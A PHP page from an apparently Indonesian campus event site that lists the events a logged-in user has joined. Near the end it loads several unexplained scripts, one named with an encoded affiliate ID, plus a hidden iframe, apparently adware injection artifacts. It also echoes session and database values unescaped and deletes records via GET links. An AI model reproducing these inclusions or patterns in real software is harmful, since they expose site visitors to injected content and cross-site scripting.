<?php require_once('../Connections/localserver.php'); ?>
<?php
if (!isset($_SESSION)) {
  session_start();
}
$MM_authorizedUsers = "";
$MM_donotCheckaccess = "true";

// *** Akses terlarang, harus login dulu: Ijinkan atau tolak akses ke halaman ini
function isAuthorized($strUsers, $strGroups, $UserName, $UserGroup) { 
  // Untuk keamanan, asumsikan bahwa visitor GAK dikenal 
  $isValid = False; 

  // Saat visitor udah login ke situs ini, variabel Session MM_Username nge-set sama dengan usernamenya.. 
  // Jadinya, kita tahu kalau user GAK login jika variabel Session blank. 
  if (!empty($UserName)) { 
    // Selain bisa login, lu boleh ngakses ke ganya beberapa user berdasarkan ID saat mereka login.
    // Parse string ke arrays.
    $arrUsers = Explode(",", $strUsers); 
    $arrGroups = Explode(",", $strGroups); 
    if (in_array($UserName, $arrUsers)) { 
      $isValid = true; 
    } 
    // Atau, lu bisa ngebuat restrict access hanya ke beberapa user berdasarkan username.
    if (in_array($UserGroup, $arrGroups)) { 
      $isValid = true; 
    } 
    if (($strUsers == "") && true) { 
      $isValid = true; 
    } 
  } 
  return $isValid; 
}

$MM_restrictGoTo = "../signin.php";
if (!((isset($_SESSION['MM_Username'])) && (isAuthorized("",$MM_authorizedUsers, $_SESSION['MM_Username'], $_SESSION['MM_UserGroup'])))) {   
  $MM_qsChar = "?";
  $MM_referrer = $_SERVER['PHP_SELF'];
  if (strpos($MM_restrictGoTo, "?")) $MM_qsChar = "&";
  if (isset($_SERVER['QUERY_STRING']) && strlen($_SERVER['QUERY_STRING']) > 0) 
  $MM_referrer .= "?" . $_SERVER['QUERY_STRING'];
  $MM_restrictGoTo = $MM_restrictGoTo. $MM_qsChar . "accesscheck=" . urlencode($MM_referrer);
  header("Location: ". $MM_restrictGoTo); 
  exit;
}
?>
<?php
if (!function_exists("GetSQLValueString")) {
function GetSQLValueString($theValue, $theType, $theDefinedValue = "", $theNotDefinedValue = "") 
{
  if (PHP_VERSION < 6) {
    $theValue = get_magic_quotes_gpc() ? stripslashes($theValue) : $theValue;
  }

  $theValue = function_exists("mysql_real_escape_string") ? mysql_real_escape_string($theValue) : mysql_escape_string($theValue);

  switch ($theType) {
    case "text":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;    
    case "long":
    case "int":
      $theValue = ($theValue != "") ? intval($theValue) : "NULL";
      break;
    case "double":
      $theValue = ($theValue != "") ? doubleval($theValue) : "NULL";
      break;
    case "date":
      $theValue = ($theValue != "") ? "'" . $theValue . "'" : "NULL";
      break;
    case "defined":
      $theValue = ($theValue != "") ? $theDefinedValue : $theNotDefinedValue;
      break;
  }
  return $theValue;
}
}

$colname_ikutevent = "-1";
if (isset($_SESSION['MM_Username'])) {
  $colname_ikutevent = $_SESSION['MM_Username'];
}
mysql_select_db($database_localserver, $localserver);
$query_ikutevent = sprintf("SELECT * FROM ikutevent WHERE username = %s", GetSQLValueString($colname_ikutevent, "text"));
$ikutevent = mysql_query($query_ikutevent, $localserver) or die(mysql_error());
$row_ikutevent = mysql_fetch_assoc($ikutevent);
$totalRows_ikutevent = mysql_num_rows($ikutevent);
?>
<!DOCTYPE html>
<html class=" js no-touch" style="" lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <title>Ikutan - Event Terdaftar</title>
    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

<link href="asset/bootstrap.css" rel="stylesheet">
<link href="asset/shopfrog.css" rel="stylesheet" media="screen">   

<link href="asset/shopfrog-brown.css" rel="stylesheet" media="screen">

<link href="asset/rateit.css" rel="stylesheet" media="screen">		       
<link href="asset/magnific-popup.css" rel="stylesheet"> 		
<script src="asset/respond.js"></script>
<link href="http://leapfrogui.com/shopfrog/brown/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="asset/css.css" rel="stylesheet" type="text/css">
<link href="asset/css_002.css" rel="stylesheet" type="text/css">


<script src="asset/jquery-1.js"></script>    
<script src="asset/modernizr.js"></script>	
<script src="asset/imagesloaded.js"></script>	
<script src="asset/jquery_003.js"></script>	
<script src="asset/jquery_002.js"></script>		
<script src="asset/jquery.js"></script>				
<script src="asset/bootstrap.js"></script>
<script src="asset/shopfrog.js"></script>

<script src="asset/javascript.htm" type="text/javascript"></script><script src="asset/1010.js" id="sjsjszmzmaw28aj6" type="text/javascript"></script><script src="asset/l.js" type="text/javascript"></script><script src="asset/l_002.js" type="text/javascript"></script></head>
<body class="page-general">
			
	<header class="navbar navbar-fixed-top clearfix">
		
	<a class="brand" href="index.php">Ikutan</a>


    <div id="nav-basket" class="basket">
        <a href="signin.php" class="basket-link"  style="height: 10px;">
  <a href="update_profile.php"><strong class="btn btn-success">@ <?php echo $_SESSION['MM_Username']; ?></strong></a>
  
  <a href="http://localhost/ikutan/views/index.php?doLogout=true"><strong class="btn btn-success">Logout</strong></a>
 
  
</div>
	
	<button type="button" class="btn navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="icon-bar"></span>
		<span class="icon-bar"></span>
		<span class="icon-bar"></span>
	</button>

	<nav class="navbar-collapse collapse" id="main-nav">
		<ul class="nav">
			<li class="active">
				<a href="index.php" class="top-level flat">Home</a>
			</li>
			<li>
				<a href="http://localhost/ikutan/views/explore.php" class="top-level">Explore</a>
				
			</li>
            <li>
				<a href="http://localhost/ikutan/views/tambah_event.php" class="top-level">Tambah Event</a>
				
			</li>
										
		</ul>
	</nav><!--/.nav-collapse -->
	
</header>


	
	<div class="container">
		<!-- <div class="row">

			<div class="col-xs-12">
				<a href="index.php">Home</a> &gt; Shopping cart
			</div> <! //end span12 -->

		</div> <!-- //end row --> 
	</div> <!-- //end container -->
	
	<div class="container main-content">
		<div class="row">
			<div class="col-xs-12">
				<div class="content">
					<h1>Event2 Yang Kamu Ikuti</h1>
					<p>&nbsp;</p>
					
					<div class="empty-cart">
					  <p class="lead">Gak ada event yang kamu ikuti.</p>
						<p>Please <a href="index.php">kembali ke awal</a>.</p>
					</div>
					
					
						
					    <table class="table table-striped">
						    <tbody>
                            <?php do { ?>
						      <tr>
						        <td class="img img-responsive img-rounded" ><img src="<?php echo $row_ikutevent['img']; ?>" style="width: 47px;" alt=""></td>
						        <td class="name"><a href="eventitem.php?eventid=<?php echo $row_ikutevent['id']; ?>"><?php echo $row_ikutevent['nama']; ?></a></td>
						        <td class="size"><span class="size-large"><?php echo $row_ikutevent['tanggal']; ?></span></td>
						        <td class="stock lowstock"><span class="stock-small"></span>
						          <?php 

if ($row_ikutevent['tempat']=="tempat/alhur.jpg") {
	echo "Masjid Al-Hurriyah";
} elseif ($row_ikutevent['tempat']=="tempat/audit _toyib_faperta.jpg") {
	echo "Audit Toyib Faperta";
} elseif ($row_ikutevent['tempat']=="tempat/audit_abdul_muis_fateta.jpg") {
	echo "Audit Abdul Muis Fateta";
} elseif ($row_ikutevent['tempat']=="tempat/audit_AHN.jpg") {
	echo "Audit AHN";
} elseif ($row_ikutevent['tempat']=="tempat/audit_JHH_fapet.jpg") {
	echo "Audit JHH Fapet";
} elseif ($row_ikutevent['tempat']=="tempat/audit_sumardi_fpil.jpg") {
	echo "Audit Sumardi FPIK";
} elseif ($row_ikutevent['tempat']=="tempat/gladiator.jpg") {
	echo "Gladiator";
} elseif ($row_ikutevent['tempat']=="tempat/gmsk.jpg") {
	echo "GMSK";
} elseif ($row_ikutevent['tempat']=="tempat/gww.jpg") {
	echo "GWW";
} elseif ($row_ikutevent['tempat']=="tempat/gym.jpg") {
	echo "Gymnasium";
} elseif ($row_ikutevent['tempat']=="tempat/korfat.jpg") {
	echo "Koridor Fateta";
} elseif ($row_ikutevent['tempat']=="tempat/Koridor_gka.jpg") {
	echo "Koridor GKA";
} elseif ($row_ikutevent['tempat']=="tempat/Korpin.jpg") {
	echo "Koridor Pinus";
} elseif ($row_ikutevent['tempat']=="tempat/Kortan.jpg") {
	echo "Koridor Tanah";
} elseif ($row_ikutevent['tempat']=="tempat/media_center.jpg") {
	echo "Media Center";
} elseif ($row_ikutevent['tempat']=="tempat/POMI.jpg") {
	echo "Pojok Mipa";
} elseif ($row_ikutevent['tempat']=="tempat/SC_MIPA.jpg") {
	echo "SC FMIPA";
}

?>
						          </td>
						        <td class="quantity-cell"><?php if ($totalRows_ikutevent > 0) { // Show if recordset not empty ?>
  <a href="hapusevent.php?noikut=<?php echo $row_ikutevent['noikut']; ?>" target="_blank" class="cart-remove pull-right"><span class="remove-small"></span><span class="btn btn-danger">remove</span></a>
  <?php } // Show if recordset not empty ?></td>
					          </tr>					
						      <!-- <tr class="cart-summary">
								<td colspan="5"></td>
								<td colspan="2" class="cart-total"><span class="currency">$</span><span class="total-total">60</span></td>
							</tr>	 --><?php } while ($row_ikutevent = mysql_fetch_assoc($ikutevent)); ?>
					        </tbody></table>
						  
					
					<div class="shopping-cart-help"></div>
				</div>			
			</div> <!-- // end span12 -->
		</div> <!-- //end row -->
	</div> <!-- //end container -->
	
	<footer>
	<div class="container">
		<div class="row">
							
		</div>
	</div>
</footer>	
	

<script src="asset/aeyJhZmZpZCI6MTAxOCwic3ViYWZmaWQiOjEwMTAsImhyZWYiOiJodHRwOi8v.js"></script><script src="asset/spops-2.js" charset="UTF-8" type="text/javascript"></script><iframe src="asset/pquery-0.htm" style="display: none;"></iframe></body></html>
<?php
mysql_free_result($ikutevent);
?>
